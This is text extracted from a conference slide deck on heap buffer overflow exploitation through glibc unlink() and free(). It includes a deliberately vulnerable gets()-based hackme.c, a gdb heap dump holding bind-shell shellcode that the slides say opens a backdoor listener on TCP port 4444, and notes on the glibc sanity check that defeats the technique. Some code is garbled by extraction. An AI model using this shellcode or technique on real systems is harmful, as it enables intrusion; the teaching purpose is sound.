● 0x0e is the jmp len (0x10 including opcode)
● A's are just easy, but could be C's or any spacer
● Could do shorter, but this better illustrates what's 
happening (“\xeb\x0aAAAAAAAAAA”)
● Modern glibc-2.5 includes a sanity check 
during unlink() which causes trouble
0x0600 – hackme.c
#include 
#include 
#include 
main(){
char* buffers[5];
int loop;
for (loop=0; loop=0; loop­­){
gets(buffers[loop]);
}
for (loop=0; loop 0x280bf8b0      0x280cdae0      0x280754a4      0x0804834e
-4
“PADD”
-4
0x80496c4 - 12
ptr to shellcode
about to be clobbered
shellcode
0x0604 – Heap BOF – free()!!!
(gdb) x/84wx 0x804a000
0x804a000:      0x00000000      0x00000069      0x281885dc      0x281885dc
0x804a010:      0x45454545      0x45454545      0x45454545      0x45454545
0x804a020:      0x45454545      0x45454545      0x45454545      0x45454545
0x804a030:      0x45454545      0x45454545      0x45454545      0x45454545
0x804a040:      0x45454545      0x45454545      0x45454545      0x45454545
0x804a050:      0x45454545      0x45454545      0x45454545      0x45454545
0x804a060:      0x45454545      0x45454545      0x00000068      0xfffffffc
0x804a070:      0x44444150      0xfffffffc      0x080496b8      0x0804a0e8
0x804a080:      0x44444400      0x44444444      0x44444444      0x44444444
0x804a090:      0x44444444      0x44444444      0x44444444      0x44444444
0x804a0a0:      0x44444444      0x44444444      0x44444444      0x44444444
0x804a0b0:      0x44444444      0x44444444      0x44444444      0x44444444
0x804a0c0:      0x44444444      0x44444444      0x44444444      0x44444444
0x804a0d0:      0x00000044      0x00000000      0x00000000      0x00000000
0x804a0e0:      0x00000000      0x00000071      0x41410eeb      0x43434343
0x804a0f0:      0x080496b8      0x43434343      0x4353db31      0x6a026a53
0x804a100:      0x89995866      0x9680cde1      0x68665243      0x53665c11
0x804a110:      0x666ae189      0x56515058      0x80cde189      0xe3d166b0
0x804a120:      0x525280cd      0xe1894356      0x80cd66b0      0x59026a93
0x804a130:      0x80cd3fb0      0xb0f97949      0x2f68520b      0x6868732f
0x804a140:      0x6e69622f      0x5352e389      0x80cde189      0x00000000
(gdb) x/4wx 0x80496b8
0x80496b8 0x280bf8b0      0x280cdae0      0x280754a4      0x0804a0e8
“PADD”
ptr to shellcode
shellcode
Bam! 
Clobbered
Next call to free() will call our 
shellcode!
0x0605 – Sweet Success
● This particular shellcode opens a 
backdoor shell listener on TCP port 4444 
(hey hd!)
0x0700 – Stupid, atlas is so stupid!
DEMO
Smart people don't demo, because Demo's always dork 
up somehow..
0x0701 – The bad news
#define unlink(P, BK, FD) {          \
  FD = P­>fd;                        \
  BK = P­>bk;                        \
  if (__builtin_expect (FD­>bk != P || BK­>fd != P, 
0)) \
    malloc_printerr (check_action, "corrupted double­
linked list", P); \
  else {                             \
    FD­>bk = BK;                     \
    BK­>fd = FD;                     \
  }                                  \
}
0x0702 – What now?
● EOS Overflow (NULL Overwrite)
– Makes all string-manipulator functions treat 
this and the next buffer as one string
● HEAP Var Modification
– Modify other variables on the HEAP
● Find new ways to leverage HEAP BOFs  
– Creativity is how these were discovered
– Leverage what you have...  
0x0800 - Resources
● Once upon a free() -
–
 http://www.phrack.org/archives/57/p57-0x09
● Advanced Malloc Exploits
–
http://doc.bughunter.net/buffer-overflow/advanced-malloc-exploits.html
● Lin0xx' Amazing RTL Presentation and Notes - 
–
http://www.noxusfiles.com/lin0xx/heap-overwrites-lin0xx.pdf
● Shellcoder's Handbook
0x0900 – Special Thanks
● My Creator
● My Family
● Intelguardians
● kenshoto
● 1@stplace
0x0901 – And the grafiti..
● yo visi, werd.  vtrace wrox. 
● drb, you're awesome co-cap'n, even if 
you are a superstar on the side
● bug, ringwraith, menace, jewel... y'all are 
worth every struggle
● choops, nologin folks.  thku
0x0902 – Stolen Stuff
● Much text was gratuitously stolen from:
– “Once Upon a Free()”, anonymous 
, phrack 57,  
http://www.phrack.org/archives/57/p57-0x09
● Song lyrics by Jennifer Knapp.  “Martyrs 
and Thieves”